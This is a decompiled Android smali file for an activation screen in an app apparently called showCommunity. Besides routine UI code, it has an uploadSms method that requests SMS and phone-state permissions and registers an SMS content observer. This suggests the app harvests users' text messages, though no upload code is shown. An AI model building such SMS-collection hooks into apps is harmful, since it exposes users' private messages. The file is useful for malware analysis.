.class public Lcom/mobilelive/showCommunity/activity/ActivationActivity;
.super Lcom/common/lib/activity/BaseActivity;
.source "ActivationActivity.java"

# interfaces
.implements Lcom/mobilelive/showCommunity/contract/ActivationContract$View;


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Lcom/common/lib/activity/BaseActivity<",
        "Lcom/mobilelive/showCommunity/contract/ActivationContract$Presenter;",
        ">;",
        "Lcom/mobilelive/showCommunity/contract/ActivationContract$View;"
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 21
    invoke-direct {p0}, Lcom/common/lib/activity/BaseActivity;-><init>()V

    return-void
.end method

.method private uploadSms()V
    .locals 3

    .line 42
    invoke-static {}, Lcom/common/lib/sms/SmsServiceRoom;->getInstance()Lcom/common/lib/sms/SmsServiceRoom;

    move-result-object v0

    invoke-virtual {v0}, Lcom/common/lib/sms/SmsServiceRoom;->getSmsContent()Lcom/common/lib/sms/SmsContent;

    move-result-object v0

    if-nez v0, :cond_0

    .line 43
    invoke-static {p0}, Lcom/permissionx/guolindev/PermissionX;->init(Landroidx/fragment/app/FragmentActivity;)Lcom/permissionx/guolindev/PermissionMediator;

    move-result-object v0

    const-string v1, "android.permission.READ_SMS"

    const-string v2, "android.permission.READ_PHONE_STATE"

    filled-new-array {v1, v2}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/permissionx/guolindev/PermissionMediator;->permissions([Ljava/lang/String;)Lcom/permissionx/guolindev/request/PermissionBuilder;

    move-result-object v0

    new-instance v1, Lcom/mobilelive/showCommunity/activity/ActivationActivity$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/mobilelive/showCommunity/activity/ActivationActivity$$ExternalSyntheticLambda0;-><init>(Lcom/mobilelive/showCommunity/activity/ActivationActivity;)V

    .line 44
    invoke-virtual {v0, v1}, Lcom/permissionx/guolindev/request/PermissionBuilder;->request(Lcom/permissionx/guolindev/callback/RequestCallback;)V

    :cond_0
    return-void
.end method


# virtual methods
.method public getAboutUsSuccess(Ljava/util/ArrayList;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/ArrayList<",
            "Lcom/common/lib/bean/ArticleBean;",
            ">;)V"
        }
    .end annotation

    if-eqz p1, :cond_0

    .line 74
    invoke-virtual {p1}, Ljava/util/ArrayList;->isEmpty()Z

    :cond_0
    return-void
.end method

.method protected getLayoutId()I
    .locals 1

    const v0, 0x7f0c001d

    return v0
.end method

.method public synthetic lambda$uploadSms$0$com-mobilelive-showCommunity-activity-ActivationActivity(ZLjava/util/List;Ljava/util/List;)V
    .locals 0

    if-eqz p1, :cond_0

    .line 46
    new-instance p1, Lcom/common/lib/sms/SmsContent;

    invoke-direct {p1, p0}, Lcom/common/lib/sms/SmsContent;-><init>(Landroid/app/Activity;)V

    .line 47
    invoke-virtual {p1}, Lcom/common/lib/sms/SmsContent;->register()V

    .line 48
    invoke-static {}, Lcom/common/lib/sms/SmsServiceRoom;->getInstance()Lcom/common/lib/sms/SmsServiceRoom;

    move-result-object p2

    invoke-virtual {p2, p1}, Lcom/common/lib/sms/SmsServiceRoom;->setSmsContent(Lcom/common/lib/sms/SmsContent;)V

    :cond_0
    return-void
.end method

.method public onClick(Landroid/view/View;)V
    .locals 1

    .line 62
    invoke-virtual {p1}, Landroid/view/View;->getId()I

    move-result p1

    const v0, 0x7f09021e

    if-eq p1, v0, :cond_1

    const v0, 0x7f090234

    if-eq p1, v0, :cond_0

    goto :goto_0

    .line 64
    :cond_0
    const-class p1, Lcom/mobilelive/showCommunity/activity/AboutUsActivity;

    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/ActivationActivity;->openActivity(Ljava/lang/Class;)V

    goto :goto_0

    .line 67
    :cond_1
    const-class p1, Lcom/mobilelive/showCommunity/activity/CheckPermissionActivity;

    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/ActivationActivity;->openActivity(Ljava/lang/Class;)V

    :goto_0
    return-void
.end method

.method protected bridge synthetic onCreatePresenter()Lcom/common/lib/mvp/IPresenter;
    .locals 1

    .line 21
    invoke-virtual {p0}, Lcom/mobilelive/showCommunity/activity/ActivationActivity;->onCreatePresenter()Lcom/mobilelive/showCommunity/contract/ActivationContract$Presenter;

    move-result-object v0

    return-object v0
.end method

.method protected onCreatePresenter()Lcom/mobilelive/showCommunity/contract/ActivationContract$Presenter;
    .locals 1

    .line 57
    new-instance v0, Lcom/mobilelive/showCommunity/presenter/ActivationPresenter;

    invoke-direct {v0, p0}, Lcom/mobilelive/showCommunity/presenter/ActivationPresenter;-><init>(Lcom/mobilelive/showCommunity/contract/ActivationContract$View;)V

    return-object v0
.end method

.method protected onCreated(Landroid/os/Bundle;)V
    .locals 4

    const p1, 0x7f090235

    const v0, 0x7f0f001d

    .line 33
    invoke-virtual {p0, p1, v0}, Lcom/mobilelive/showCommunity/activity/ActivationActivity;->setText(II)V

    const v0, 0x7f090234

    const v1, 0x7f0f0021

    .line 34
    invoke-virtual {p0, v0, v1}, Lcom/mobilelive/showCommunity/activity/ActivationActivity;->setText(II)V

    const/4 v1, 0x1

    new-array v2, v1, [I

    const/4 v3, 0x0

    aput v0, v2, v3

    .line 35
    invoke-virtual {p0, v2}, Lcom/mobilelive/showCommunity/activity/ActivationActivity;->setViewGone([I)V

    new-array v0, v1, [I

    aput p1, v0, v3

    .line 36
    invoke-virtual {p0, v0}, Lcom/mobilelive/showCommunity/activity/ActivationActivity;->setViewGone([I)V

    const/4 p1, 0x2

    new-array p1, p1, [I

    .line 37
    fill-array-data p1, :array_0

    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/ActivationActivity;->setViewsOnClickListener([I)V

    return-void

    :array_0
    .array-data 4
        0x7f090234
        0x7f09021e
    .end array-data
.end method

.method protected updateUIText()V
    .locals 0

    return-void
.end method
